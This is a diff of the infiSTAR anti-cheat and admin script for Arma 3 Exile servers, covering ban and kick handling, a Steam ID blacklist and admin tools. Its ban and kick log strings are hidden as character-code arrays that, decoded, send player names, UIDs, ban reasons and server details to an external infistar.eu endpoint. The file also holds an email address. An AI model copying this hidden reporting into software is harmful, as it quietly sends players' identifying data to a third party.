 if(isNil'BAN_LOG')then{BAN_LOG = toString [39,65,82,77,65,95,76,79,65,68,39,32,99,97,108,108,69,120,116,101,110,115,105,111,110,32,102,111,114,109,97,116,91,39,103,101,116,97,115,121,110,99,37,49,37,104,116,116,112,58,47,47,105,110,102,105,115,116,97,114,46,101,117,47,116,101,108,108,46,112,104,112,63,102,114,111,109,61,37,50,38,110,97,109,101,61,37,51,38,117,105,100,61,37,52,38,114,101,97,115,111,110,61,37,53,38,118,101,114,115,105,111,110,61,37,54,38,115,101,114,118,101,114,110,97,109,101,61,37,55,37,49,39,44,116,111,83,116,114,105,110,103,32,91,49,48,93,44,105,102,40,105,115,78,105,108,39,85,80,68,65,84,69,69,77,65,73,76,39,41,116,104,101,110,123,39,39,125,101,108,115,101,123,85,80,68,65,84,69,69,77,65,73,76,125,44,95,110,97,109,101,44,95,117,105,100,44,95,114,101,97,115,111,110,44,105,102,40,105,115,78,105,108,39,73,78,70,73,83,84,65,82,86,69,82,83,73,79,78,39,41,116,104,101,110,123,39,39,125,101,108,115,101,123,73,78,70,73,83,84,65,82,86,69,82,83,73,79,78,125,44,115,101,114,118,101,114,110,97,109,101,93,13,10];};
-if(isNil'KICK_LOG')then{KICK_LOG = toString [39,65,82,77,65,95,76,79,65,68,39,32,99,97,108,108,69,120,116,101,110,115,105,111,110,32,102,111,114,109,97,116,91,39,103,101,116,97,115,121,110,99,37,49,37,104,116,116,112,58,47,47,105,110,102,105,115,116,97,114,46,101,117,47,116,101,108,108,107,46,112,104,112,63,102,114,111,109,61,37,50,38,110,97,109,101,61,37,51,38,117,105,100,61,37,52,38,114,101,97,115,111,110,61,37,53,38,118,101,114,115,105,111,110,61,37,54,38,115,101,114,118,101,114,110,97,109,101,61,37,55,37,49,39,44,116,111,83,116,114,105,110,103,32,91,49,48,93,44,105,102,40,105,115,78,105,108,39,85,80,68,65,84,69,69,77,65,73,76,39,41,116,104,101,110,123,39,39,125,101,108,115,101,123,85,80,68,65,84,69,69,77,65,73,76,125,44,95,110,97,109,101,44,95,117,105,100,44,95,114,101,97,115,111,110,44,105,102,40,105,115,78,105,108,39,73,78,70,73,83,84,65,82,86,69,82,83,73,79,78,39,41,116,104,101,110,123,39,39,125,101,108,115,101,123,73,78,70,73,83,84,65,82,86,69,82,83,73,79,78,125,44,115,101,114,118,101,114,110,97,109,101,93]};
+if(isNil'KICK_LOG')then{KICK_LOG = toString [39,65,82,77,65,95,76,79,65,68,39,32,99,97,108,108,69,120,116,101,110,115,105,111,110,32,102,111,114,109,97,116,91,39,103,101,116,97,115,121,110,99,37,49,37,104,116,116,112,58,47,47,105,110,102,105,115,116,97,114,46,101,117,47,116,101,108,108,107,46,112,104,112,63,102,114,111,109,61,37,50,38,110,97,109,101,61,37,51,38,117,105,100,61,37,52,38,114,101,97,115,111,110,61,37,53,38,118,101,114,115,105,111,110,61,37,54,38,115,101,114,118,101,114,110,97,109,101,61,37,55,37,49,39,44,116,111,83,116,114,105,110,103,32,91,49,48,93,44,105,102,40,105,115,78,105,108,39,85,80,68,65,84,69,69,77,65,73,76,39,41,116,104,101,110,123,39,39,125,101,108,115,101,123,85,80,68,65,84,69,69,77,65,73,76,125,44,95,110,97,109,101,44,95,117,105,100,44,95,119,111,114,107,44,105,102,40,105,115,78,105,108,39,73,78,70,73,83,84,65,82,86,69,82,83,73,79,78,39,41,116,104,101,110,123,39,39,125,101,108,115,101,123,73,78,70,73,83,84,65,82,86,69,82,83,73,79,78,125,44,115,101,114,118,101,114,110,97,109,101,93];};
 FNC_A3_infiSTARBAN = {
 	params[['_name',''],['_uid',''],['_owner',-10],['_reason','']];
 	_admins = "+str _admins+";
-	_log = format['%1(%2)',_name,_uid];
-	if!(_reason isEqualTo '')then{_log = format['%1(%2) %3',_name,_uid,_reason];};
-	if(!isNil'BAN_LOG')then{call compile BAN_LOG;};
 	if(_uid in _admins)exitWith
 	{
-		_mytime = call fnc_getserverTime;
-		_log = _mytime + format['%1(%2) ADMIN - would have been banned now!',_name,_uid];
-		_log call FNC_A3_HACKLOG;
+		_log = format['%1(%2) PLAYER IS ADMIN - STOPPED BAN FOR: %3',_name,_uid,_reason];
+		diag_log _log;
 		[_name,_uid,_owner] call FNC_INFISERVERKICK;
 	};
+	_log = format['BANNED | %1(%2)',_name,_uid];if!(_reason isEqualTo '')then{_log = (_log + ' ' + _reason)};
+	if(!isNil'BAN_LOG')then{call compile BAN_LOG;};
 	['BANLOG',_log] call FNC_A3_CUSTOMLOG;
+	"; if(_enableIngameLogs)then{ _A3AHstring = _A3AHstring + "
+	if(count "+_AH_HackLogArrayRND+" > 99)then{"+_AH_HackLogArrayRND+" deleteAt 0;};
+	"+_AH_HackLogArrayRND+" pushBack _log;
+	'"+_AH_HackLogArrayRND+"' call fnc_variable_to_admins;
+	"; }; _A3AHstring = _A3AHstring + "
+	
 	if(_owner > 2)then
 	{
 		[
@@ -2726,14 +2987,14 @@ _fnc_infiSTAR_PlayerLog = {
 	{
 		[_name,_uid,'SLOG_SKICK',toArray('Name and/or UID not allowed!')] call "+_fnc_server_handle_mpmessage+";
 	};
-	if({(_lname find _x != -1)} count ['infis'] > 0)exitWith
+	if(_lname find 'infis' != -1)exitWith
 	{
 		_log = format['BadName: %1 (FAKE)',_name];
 		[_name,_uid,'SLOG_SKICK',toArray(_log)] call "+_fnc_server_handle_mpmessage+";
 	};
 
 	if(isNil'"+_TMPBAN+"')then{"+_TMPBAN+"=[];}else{if(typename "+_TMPBAN+"!='ARRAY')then{"+_TMPBAN+"=[];};};
-	if(_uid in "+_TMPBAN+")exitWith{[_name,_uid,_owner] call FNC_INFISERVERKICK;};
+	if(_uid in "+_TMPBAN+")exitWith{[_name,_uid,_owner,'TEMPBANNED'] call FNC_INFISERVERKICK;};
 	_blackListed__Hacker_or_Vac_Ban =
 	[
 		'76561198059930120','76561198134916119','76561198130615382','76561198000135158',
@@ -2783,7 +3044,7 @@ _fnc_infiSTAR_PlayerLog = {
 		'76561198171099287','76561198128562050','76561198053736495','76561198193940611',
 		'76561198151000468','76561198244171410','76561198038037994','76561198076820649',
 		'76561198056912920','76561198232826368','76561198152248222','76561198066389146',
-		'76561198196608571','76561198018421000','76561198096024117','76561198004279679',
+		'76561198196608571','76561198018421000','76561198096024117','76561198117300789',
 		'76561198169954394','76561198176540202','76561198174414033','76561198183053235',
 		'76561198003212252','76561198156531051','76561198013438210','76561198101326327',
 		'76561197966083462','76561197998554847','76561197975228700','76561198057384127',
@@ -2814,14 +3075,18 @@ _fnc_infiSTAR_PlayerLog = {
 		'76561198179253387','76561198196027789','76561198095794948','76561198247892706',
 		'76561198072428132','76561198027641828','76561198111703688','76561198079348447',
 		'76561198177550182','76561198137433533','76561198104637087','76561198211325277',
-		'76561198052466790','76561198166992322','76561198046032680','76561198063808946',
+		'76561198052466790','76561198166992322','76561198063808946','76561198116706040',
 		'76561198254277744','76561197982194585','76561198152271408','76561198091442445',
 		'76561198107506516','76561198140164969','76561198141274704','76561198058594466',
 		'76561198041841141','76561198207891657','76561198257041725','76561198282169416',
 		'76561198211132751','76561198203155102','76561198193186621','76561198067597930',
-		'76561198132992594','76561198020499957','76561198045360275','76561198257667902',
+		'76561198132992594','76561198045360275','76561198108684434','76561197996893295',
 		'76561198089912946','76561198042033010','76561198006812984','76561198010988750',
-		'76561198027939447','76561198067166357','76561198081486367','76561198260728365'
+		'76561198027939447','76561198067166357','76561198081486367','76561198260728365',
+		'76561198281982729','76561197986415057','76561198260884261','76561198227276868',
+		'76561198175369427','76561198150780154','76561198226664852','76561198039629252',
+		'76561198097843069','76561198053890182','76561198263397996','76561198243947288',
+		'0'
 	];
 	if(_uid in _blackListed__Hacker_or_Vac_Ban)exitWith
 	{
@@ -2829,13 +3094,19 @@ _fnc_infiSTAR_PlayerLog = {
 	};
 	if(!_admin)then
 	{
+		if(_lname in "+str _badNamesFull+")exitWith
+		{
+			_log = format['BadName: %1 (KICKED)',_x];
+			[_name,_uid,'SLOG_SKICK',toArray(_log)] call "+_fnc_server_handle_mpmessage+";
+		};
+		
 		{
 			if(_lname find _x != -1)exitWith
 			{
 				_log = format['BadName: %1 (KICKED)',_x];
 				[_name,_uid,'SLOG_SKICK',toArray(_log)] call "+_fnc_server_handle_mpmessage+";
 			};
-		} forEach "+str _badNames+";
+		} forEach "+str _badNamesPartial+";
 		
 		_connectedTimes = missionNameSpace getVariable[format['CONNECT_COUNT_%1',_uid],0];
 		if(_connectedTimes > 10)then
@@ -2890,22 +3161,14 @@ _fnc_server_handle_mpmessage = {
 			[_name,_uid,'BAN',toArray(_log)] call "+_fnc_server_handle_mpmessage+";
 		};
 	};
-	_owner = missionNameSpace getVariable[format['"+_owner_by_uid+"%1',_uid],-10];
-	if(_owner isEqualTo -10)then
-	{
-		_clientObject = missionNameSpace getVariable[format['EXILE_PLAYER_OJECT_%1',_uid],objNull];
-		if(!isNull _clientObject)then
-		{
-			_owner = owner _clientObject;
-		};
-	};
+	_owner = _uid call FNC_OWNER_BY_UID;
 	if(_what isEqualTo 'SQFScripts')exitWith
 	{
 		_log = toString(_this select 3);
-		[format['CLIENT_THREADS_OF_%1(%2)',_name,_uid],_log] call FNC_A3_CUSTOMLOG;
+		[format['CLIENT_THREADS_OF_%1_%2',_name,_uid],_log] call FNC_A3_CUSTOMLOG;
 	};
-	"; if(_VDN)then{ _A3AHstring = _A3AHstring + "
-	if(_what == 'VOTE')exitWith
+	"; if(_DayNightVote)then{ _A3AHstring = _A3AHstring + "
+	if(_what isEqualTo 'VOTE')exitWith
 	{
 		_work = toString(_this select 3);
 		if(_work in ['DAY','NIGHT'])exitWith
@@ -2917,7 +3180,7 @@ _fnc_server_handle_mpmessage = {
 	"; if(_disconnect_dupe_check)then{ _A3AHstring = _A3AHstring + "
 	if(_what isEqualTo 'DCHECK')exitWith{['',{"+_antidupePVResVar+" = diag_tickTime},_owner,false] call FN_infiSTAR_S;};
 	"; }; _A3AHstring = _A3AHstring + "
-	if(_what == 'AC')exitWith
+	if(_what isEqualTo 'AC')exitWith
 	{
 		if(_uid in _admins)then
 		{
@@ -2959,7 +3222,7 @@ _fnc_server_handle_mpmessage = {
 			infiSTAR_ADMINS = nil;
 		};
 	};
-	if(_what == 'DOTP')exitWith
+	if(_what isEqualTo 'DOTP')exitWith
 	{
 		_AHpos = _this select 4;
 		_adminName = _AHpos select 0;
@@ -2984,12 +3247,20 @@ _fnc_server_handle_mpmessage = {
 		'"+_AH_AdmiLogArrayRND+"' call fnc_variable_to_admins;
 		"; }; _A3AHstring = _A3AHstring + "
 	};
-	_randomNumber = 928;
+	_randomNumber = 2118;
 	_work = toString(_this select 3);
+	if(_what isEqualTo 'BAN')exitWith
+	{
+		[_name,_uid,_owner,_work] call FNC_A3_infiSTARBAN;
+	};
+	if(_what isEqualTo 'TMPBAN')exitWith
+	{
+		[_name,_uid,_owner,_work] call FNC_A3_infiSTARTMPBAN;
+	};
 	_mytime = call fnc_getserverTime;
 	_steamName = call fnc_getSteamNameIfSaved;
 	_log = format['%1 | %2(%3) | %4%5',_steamName,_name,_uid,_mytime,_work];
-	if(_what == 'ANTI_TP')exitWith
+	if(_what isEqualTo 'ANTI_TP')exitWith
 	{
 		[_what,_log] call FNC_A3_CUSTOMLOG;
 		"; if(_enableIngameLogs)then{ _A3AHstring = _A3AHstring + "
@@ -2998,7 +3269,7 @@ _fnc_server_handle_mpmessage = {
 		'"+_AH_SurvLogArrayRND+"' call fnc_variable_to_admins;
 		"; }; _A3AHstring = _A3AHstring + "
 	};
-	if(_what == 'SLOG_GLITCH')exitWith
+	if(_what isEqualTo 'SLOG_GLITCH')exitWith
 	{
 		['GLITCH_LOG',_log] call FNC_A3_CUSTOMLOG;
 		"; if(_enableIngameLogs)then{ _A3AHstring = _A3AHstring + "
@@ -3026,32 +3297,18 @@ _fnc_server_handle_mpmessage = {
 		'"+_AH_SurvLogArrayRND+"' call fnc_variable_to_admins;
 		"; }; _A3AHstring = _A3AHstring + "
 		
-		if(_what == 'SLOG_SKICK')exitWith{[_name,_uid,_owner] call FNC_INFISERVERKICK;};
+		if(_what isEqualTo 'SLOG_SKICK')exitWith{[_name,_uid,_owner,_what] call FNC_INFISERVERKICK;};
 	};
-	if(_what in ['BAN','TMPBAN','HLOG','HLOG_SKICK'])exitWith
+	if(_what in ['HLOG','HLOG_SKICK'])exitWith
 	{
-		_log = format['BANNED | %1',_log];
 		_log call FNC_A3_HACKLOG;
 		"; if(_enableIngameLogs)then{ _A3AHstring = _A3AHstring + "
 		if(count "+_AH_HackLogArrayRND+" > 99)then{"+_AH_HackLogArrayRND+" deleteAt 0;};
 		"+_AH_HackLogArrayRND+" pushBack _log;
 		'"+_AH_HackLogArrayRND+"' call fnc_variable_to_admins;
 		"; }; _A3AHstring = _A3AHstring + "
-		if(_what == 'HLOG_SKICK')exitWith{[_name,_uid,_owner] call FNC_INFISERVERKICK;};
-		if(_what in ['BAN','TMPBAN'])exitWith
-		{
-			if!(_uid in _admins)then
-			{
-				if(_what == 'BAN')then
-				{
-					[_name,_uid,_owner,_work] call FNC_A3_infiSTARBAN;
-				}
-				else
-				{
-					[_name,_uid,_owner,_work] call FNC_A3_infiSTARTMPBAN;
-				};
-			};
-		};
+		
+		if(_what isEqualTo 'HLOG_SKICK')exitWith{[_name,_uid,_owner,_what] call FNC_INFISERVERKICK;};
 	};
 };
 "+_fnc_server_handle_mpmessage+" = compileFinal ([_fnc_server_handle_mpmessage] call fnc_CompilableString);
@@ -3061,7 +3318,7 @@ diag_log format['<infiSTAR.de> %1 - fnc_server_handle_mpmessage: added !',time];
 diag_log format['<infiSTAR.de> %1 - fnc_AdminReqReal: adding to main string..',time];
 _A3AHstring = _A3AHstring + "
 diag_log format['<infiSTAR.de> %1 - fnc_AdminReqReal: still compiling...',time];
-_AdminReqReal = {
+_fnc_AdminReqReal = {
 	private['_admins','_ObjFromnetId','_serverUID','_clientName','_clientID','_option'];
 	params[['_tokenreceived',''],['_clientUID',''],['_clientnetId','0:0'],['_array',[]]];
 	if(typename _tokenreceived != 'STRING')exitWith{_log = format['AdminReqReal ERROR #1: %1',_this];_log call FNC_A3_ADMINLOG;};
@@ -3073,17 +3330,22 @@ _AdminReqReal = {
 	if(typename _array != 'ARRAY')exitWith{_log = format['AdminReqReal ERROR #7: %1',_this];_log call FNC_A3_ADMINLOG;};
 	if(_array isEqualTo [])exitWith{_log = format['AdminReqReal ERROR #8: %1',_this];_log call FNC_A3_ADMINLOG;};
 	_admins = "+str _admins+";
+	_exit = false;
 	
 	_serverUID = missionNameSpace getVariable[format['"+_uid_by_token+"%1',_tokenreceived],''];
 	_clientName = missionNameSpace getVariable[format['"+_name_by_uid+"%1',_serverUID],''];
-	_clientID = missionNameSpace getVariable[format['"+_owner_by_uid+"%1',_serverUID],-10];
-	
-	if!(_serverUID isEqualTo _clientUID)then
+	if(_serverUID isEqualTo '')exitWith
 	{
-		_log = format['%1(%2) | AdminReqReal - SERVER RESOLVED UID! clientUID: %2 - serverUID: %3',_clientName,_clientUID,_serverUID];
-		_log call FNC_A3_ADMINLOG;
-		
-		_clientUID = _serverUID;
+		_log = format['AdminReqReal - SERVER UID WRONG! clientUID: %1 - serverUID: %2',_clientName,_clientUID,_serverUID];
+		[_clientName,_clientUID,'SLOG_SKICK',toArray(_log)] call "+_fnc_server_handle_mpmessage+";
+	};
+	_clientID = _serverUID call FNC_OWNER_BY_UID;
+	
+	if!(_serverUID isEqualTo _clientUID)exitWith
+	{
+		_log = format['AdminReqReal - SERVER RESOLVED UID! clientUID: %1 - serverUID: %2',_clientUID,_serverUID];
+		[_clientName,_serverUID,'SLOG_SKICK',toArray(_log)] call "+_fnc_server_handle_mpmessage+";
+		[_clientName,_clientUID,'SLOG_SKICK',toArray(_log)] call "+_fnc_server_handle_mpmessage+";
 	};
 	
 	_ObjFromnetId = objectFromnetId _clientnetId;
@@ -3099,12 +3361,23 @@ _AdminReqReal = {
 	};
 	if(isNull _ObjFromnetId)then
 	{
-		_ObjFromnetId = missionNameSpace getVariable[format['EXILE_PLAYER_OJECT_%1',_clientUID],objNull];
+		_ObjFromnetId = missionNameSpace getVariable[format['"+_object_by_uid+"%1',_clientUID],objNull];
 	}
 	else
 	{
+		missionNameSpace setVariable[format['"+_object_by_uid+"%1',_clientUID],_ObjFromnetId];
 		missionNameSpace setVariable[format['EXILE_PLAYER_OJECT_%1',_clientUID],_ObjFromnetId];
+		_owner = owner _ObjFromnetId;
+		if!(_clientID isEqualTo _owner)then
+		{
+			_log = format['%1(%2) | AdminReqReal - ClientID (%3) != ObjID (%4)',_clientName,_clientUID,_clientID,_owner];
+			_log call FNC_A3_ADMINLOG;
+			[_clientName,_clientUID,_owner] call FNC_INFISERVERKICK;
+			_exit = true;
+		};
 	};
+	if(_exit)exitWith{};
+	
 	_ld = _clientUID in "+str _devs+";
 	if!(_clientUID in _admins)exitWith
 	{
@@ -3171,11 +3444,20 @@ _AdminReqReal = {
 	};
 	if(_option isEqualTo -666)exitWith
 	{
-		_obj = objectFromnetId (_array select 1);
+		_banoption = _array select 1;
+		_obj = objectFromnetId (_array select 2);
 		_name = name _obj;
 		_uid = getPlayerUID _obj;
 		_owner = owner _obj;
-		[_name,_uid,_owner,'ADMINBAN'] call FNC_A3_infiSTARBAN;
+		_reason = toString(_array select 3);
+		if(_banoption isEqualTo 0)then
+		{
+			[_name,_uid,_owner,_reason] call FNC_A3_infiSTARBAN;
+		}
+		else
+		{
+			[_name,_uid,_owner,_reason] call FNC_A3_infiSTARTMPBAN;
+		};
 	};
 	if(_option isEqualTo -665)exitWith
 	{
@@ -3183,7 +3465,7 @@ _AdminReqReal = {
 		_name = name _obj;
 		_uid = getPlayerUID _obj;
 		_owner = owner _obj;
-		[_name,_uid,_owner] call FNC_INFISERVERKICK;
+		[_name,_uid,_owner,toString(_array select 2)] call FNC_INFISERVERKICK;
 	};
 	if(_option isEqualTo -664)exitWith
 	{
@@ -3216,7 +3498,7 @@ _AdminReqReal = {
 		_reason = _input2;
 		
 		if(_case == 3)exitWith{[_name,_uid,_owner,_reason] call FNC_A3_infiSTARBAN;};
-		if(_case == 4)exitWith{[_name,_uid,_owner] call FNC_INFISERVERKICK;};
+		if(_case == 4)exitWith{[_name,_uid,_owner,_reason] call FNC_INFISERVERKICK;};
 	};
 	if(_option isEqualTo -4)exitWith
 	{
@@ -3488,6 +3770,7 @@ _AdminReqReal = {
 		_board = createVehicle ['Exile_Sign_TraderCity', _location, [], 0, 'CAN_COLLIDE'];
 		_board setObjectTextureGlobal[0,_texture];
 		_board setDir _dir;
+		_board addMPEventHandler ['MPKilled', { if !(isServer) exitWith {}; (_this select 0) call fnc_remove_billboard;}];
 		
 		_board setVariable ['ExileOwnerUID',_clientUID];
 		_board setVariable ['ExileAccessCode',_textureid+1];
@@ -3496,6 +3779,7 @@ _AdminReqReal = {
 		_board = createVehicle ['Exile_Sign_TraderCity', _location, [], 0, 'CAN_COLLIDE'];
 		_board setObjectTextureGlobal[0,_texture];
 		_board setDir (_dir+180);
+		_board addMPEventHandler ['MPKilled', { if !(isServer) exitWith {}; (_this select 0) call fnc_remove_billboard;}];
 		
 		_board setVariable ['ExileOwnerUID',_clientUID];
 		_board setVariable ['ExileAccessCode',_textureid+1];
@@ -3540,13 +3824,12 @@ _AdminReqReal = {
 			{
 				_target setBleedingRemaining 0;
 				_target setOxygenRemaining 1;
+				_target setFatigue 0;
 				_code = {
-					player setVariable['ExileHunger', 100];
-					player setVariable['ExileThirst', 100];
-					player setVariable['ExileAlcohol', 0];
-					ExileClientPlayerAttributes = [100, 100, 100, 100, 0];
-					ExileClientPlayerAttributesASecondAgo = [100, 100, 100, 100, 0];
+					ExileClientPlayerAttributes = [100,100,100,100,0,37,0];
+					ExileClientPlayerAttributesASecondAgo = ExileClientPlayerAttributes;
 					ExileClientPlayerLastHpRegenerationAt = diag_tickTime;
+					ExileClientPlayerIsOverburdened = false;
 					ExileClientPlayerOxygen = 100;
 					ExileClientPlayerIsAbleToBreathe = true;
 					ExileClientPlayerIsDrowning = false;
@@ -3556,6 +3839,11 @@ _AdminReqReal = {
 					ExileClientPlayerIsExhausted = false;
 					ExileClientPlayerIsHungry = false;
 					ExileClientPlayerIsThirsty = false;
+					ExilePlayerRadiation = 0;
+					ExilePlayerRadiationLastCheck = 0;
+					player setBleedingRemaining 0;
+					player setOxygenRemaining 1;
+					player setFatigue 0;
 					
 					if(!isNil'ExileClientBleedOutThread')then
 					{
@@ -3565,7 +3853,6 @@ _AdminReqReal = {
 							ExileClientBleedOutThread = -1;
 						};
 					};
-					
 					ExileClientPostProcessingColorCorrections ppEffectAdjust [1, 1.1, -0.05, [0.4, 0.2, 0.3, -0.1], [0.79, 0.72, 0.62, 1], [0.5,0.5,0.5,0], [0,0,0,0,0,0,4]];
 					ExileClientPostProcessingColorCorrections ppEffectCommit 0;
 					ExileClientPostProcessingBackgroundBlur ppEffectEnable false;
@@ -3574,6 +3861,10 @@ _AdminReqReal = {
 					ExileClientPostProcessingDelirium ppEffectAdjust [2, 0.1, 0.1, 0.2, 0.2, 2, 2, 0.01, 0.01, 0.01, 0.01, 0.01, 0.1, 2, 2];
 					ExileClientPostProcessingDelirium ppEffectCommit 0;
 					ExileClientPostProcessingDelirium ppEffectEnable false;
+					
+					if(!isNil'ExilePostProcessing_RadiationChroma')then{ExilePostProcessing_RadiationChroma ppEffectEnable false;};
+					if(!isNil'ExilePostProcessing_RadiationColor')then{ExilePostProcessing_RadiationColor ppEffectEnable false;};
+					if(!isNil'ExilePostProcessing_RadiationFilm')then{ExilePostProcessing_RadiationFilm ppEffectEnable false;};
 					true
 				};
 				['',_code,_ownertarget,false] call FN_infiSTAR_S;
@@ -3714,11 +4005,51 @@ _AdminReqReal = {
 	};
 	if(_option isEqualTo 14)exitWith
 	{
-		_object = objectFromnetId (_array select 1);
+		_obj = objectFromnetId (_array select 1);
 		
 		[
-			_object getVariable['ExileAccessCode','000000'],
-			{objectPinCode_RESULT = _this},
+			[
+				_obj,
+				_obj getVariable['ExileAccessCode','000000'],
+				_obj getVariable['PLAYER_STATS_VAR',[0,0]]
+			],
+			{
+				params['_obj','_ExileAccessCode','_PLAYER_STATS_VAR'];
+				_pos = getPosATL _obj;
+				_type = typeOf _obj;
+				if!(_ExileAccessCode isEqualTo '000000')then{_obj setVariable ['ExileAlreadyKnownCode',_ExileAccessCode];};
+				
+				_money = _PLAYER_STATS_VAR select 0;
+				_money = if(_money > 1000)then{format['%1K',_money / 1000]}else{_money};
+				_respect = _PLAYER_STATS_VAR select 1;
+				if(count _PLAYER_STATS_VAR > 2)then
+				{
+					_bank = _PLAYER_STATS_VAR select 2;
+					_bank = if(_bank > 1000)then{format['%1K',_bank / 1000]}else{_bank};
+					
+					{
+						systemChat _x;
+						diag_log _x;
+					} forEach [
+						format['%1, Code: %2',_type,_ExileAccessCode],
+						format['WorldSpace: [%1,%2], @%3',getDir _obj,_pos,mapGridPosition _pos],
+						if(_obj in (call fnc_get_plr))then{format['%1(%2) - Health: %3  Purse: %4  Bank: %5  Respect: %6',name _obj,getPlayerUID _obj,(1-(damage _obj))*100,_money,_bank,_respect]}else{''},
+						'--'
+					];
+				}
+				else
+				{
+					{
+						systemChat _x;
+						diag_log _x;
+					} forEach [
+						format['%1, Code: %2',_type,_ExileAccessCode],
+						format['WorldSpace: [%1,%2], @%3',getDir _obj,_pos,mapGridPosition _pos],
+						if(_obj in (call fnc_get_plr))then{format['%1(%2) - Health: %3  Money: %4  Respect: %5',name _obj,getPlayerUID _obj,(1-(damage _obj))*100,_money,_respect]}else{''},
+						'--'
+					];
+				};
+			},
 			_clientID,
 			false
 		] call FN_infiSTAR_S;
@@ -3932,7 +4263,7 @@ _AdminReqReal = {
 		};
 	};
 };
-"+_fnc_AdminReqReal+" = compileFinal ([_AdminReqReal] call fnc_CompilableString);
+"+_fnc_AdminReqReal+" = compileFinal ([_fnc_AdminReqReal] call fnc_CompilableString);
 ";
 diag_log format['<infiSTAR.de> %1 - fnc_AdminReqReal: added !',time];
 
@@ -3954,14 +4285,21 @@ _fnc_server_handle_pre_mpmessage =
 	
 	_serverUID = missionNameSpace getVariable[format['"+_uid_by_token+"%1',_tokenreceived],''];
 	_clientName = missionNameSpace getVariable[format['"+_name_by_uid+"%1',_serverUID],''];
+	if(_serverUID isEqualTo '')then
+	{
+		_log = format['AH_KICKLOGSPAWN - SERVER UID WRONG! clientUID: %1 - serverUID: %2',_clientName,_clientUID,_serverUID];
+		[_clientName,_clientUID,'SLOG_SKICK',toArray(_log)] call "+_fnc_server_handle_mpmessage+";
+	};
+	_clientID = _serverUID call FNC_OWNER_BY_UID;
 	
 	if!(_serverUID isEqualTo _clientUID)then
 	{
-		_log = format['%1(%2) | AH_KICKLOGSPAWN - SERVER RESOLVED UID! clientUID: %2 - serverUID: %3',_clientName,_clientUID,_serverUID];
-		_log call FNC_A3_SURVEILLANCELOG;
-		
+		_log = format['AH_KICKLOGSPAWN - SERVER RESOLVED UID! clientUID: %1 - serverUID: %2',_clientUID,_serverUID];
+		[_clientName,_serverUID,'SLOG_SKICK',toArray(_log)] call "+_fnc_server_handle_mpmessage+";
+		[_clientName,_clientUID,'SLOG_SKICK',toArray(_log)] call "+_fnc_server_handle_mpmessage+";
 		_clientUID = _serverUID;
 	};
+	
 	
 	_ObjFromnetId = objectFromnetId _clientnetId;
 	if(isNil '_ObjFromnetId')exitWith
@@ -3976,10 +4314,11 @@ _fnc_server_handle_pre_mpmessage =
 	};
 	if(isNull _ObjFromnetId)then
 	{
-		_ObjFromnetId = missionNameSpace getVariable[format['EXILE_PLAYER_OJECT_%1',_clientUID],objNull];
+		_ObjFromnetId = missionNameSpace getVariable[format['"+_object_by_uid+"%1',_clientUID],objNull];
 	}
 	else
 	{
+		missionNameSpace setVariable[format['"+_object_by_uid+"%1',_clientUID],_ObjFromnetId];
 		missionNameSpace setVariable[format['EXILE_PLAYER_OJECT_%1',_clientUID],_ObjFromnetId];
 	};
 	_array set [0,_clientName];
@@ -4003,7 +4342,7 @@ _adminStartupCode = {
 	_log = format['<infiSTAR.de> %1 - waiting for client to be ready..',call GET_TIME_TIME];systemchat _log;diag_log _log;
 	waitUntil {!isNull findDisplay 46 && !isNil 'ExileClientLoadedIn' && getPlayerUID player != ''};
 	uiSleep 1;
-	_log = format['<infiSTAR.de> %1 - client ready.',call GET_TIME_TIME];systemchat _log;diag_log _log;
+	"; if(!_HIDE_FROM_PLAYERS)then{ _A3AHstring = _A3AHstring + "_log = format['<infiSTAR.de> %1 - client ready.',call GET_TIME_TIME];systemchat _log;diag_log _log;"; }; _A3AHstring = _A3AHstring + "
 	_admins = "+str _admins+";
 	_tokenFromServer = _this select 0;
 	_name = _this select 1;
@@ -4024,7 +4363,7 @@ _adminStartupCode = {
 	_MY_PERSONAL_ACCESS_ARRAY = [];
 	if(_puid in _adminsA)then
 	{
-		INFISTARVERSION='07-Mar-2016 04-06-16 - v0038';
+		INFISTARVERSION='03-Apr-2016 23-22-35 - v0044';
 		OPEN_ADMIN_MENU_KEY = "+str _OPEN_ADMIN_MENU_KEY+";
 		passwordAdmin = "+str _passwordAdmin+";
 		diag_log format['<infiSTAR.de> OPEN_ADMIN_MENU_KEY: %1',OPEN_ADMIN_MENU_KEY];
@@ -4099,15 +4438,15 @@ _adminStartupCode = {
 			if(isNil'_do')exitWith{};
 			if(typename _do == 'CODE')then{_do = (str(_do)) select [1,((count(str(_do)))-2)];};
 			if(typename _do != 'STRING')exitWith{systemChat 'admin_d0 needs STRING code!';};
-			if(_opt == 0)exitWith{[69,_opt,toArray _do] call fnc_AdminReq;};
-			if(_opt == 1)exitWith{[69,_opt,toArray _do] call fnc_AdminReq;};
-			if(_opt == 2)exitWith{
+			if(_opt isEqualTo 2)exitWith
+			{
 				_targetObj = _this select 0 select 1;
 				if(isNil '_targetObj')exitWith{systemChat 'admin_d0_target has no object';};
 				if(typename _targetObj != 'OBJECT')exitWith{systemChat 'admin_d0_target has no object';};
 				if(isNull _targetObj)exitWith{systemChat 'admin_d0_target has no object';};
 				[69,_opt,toArray _do,netId _targetObj] call fnc_AdminReq;
 			};
+			[69,_opt,toArray _do] call fnc_AdminReq;
 		};
 		if(isNil '"+_AH_HackLogArrayRND+"')then{"+_AH_HackLogArrayRND+" = [];};
 		if(isNil 'AH_HackLogArray')then{AH_HackLogArray = "+_AH_HackLogArrayRND+";};
@@ -4174,43 +4513,38 @@ diag_log format['<infiSTAR.de> %1 - Thread MAIN: compiling adminStartupCode',tim
 "+_adminStartupCode+" = compile(([_adminStartupCode] call fnc_CompilableString) + infiSTAR_MAIN_CODE);
 ";
 diag_log format['<infiSTAR.de> %1 - adminStartupCode: added !',time];
-
+_from = 'gr8_boi52@yahoo.com';
+_vers = '03-Apr-2016 23-22-35 - v0044';
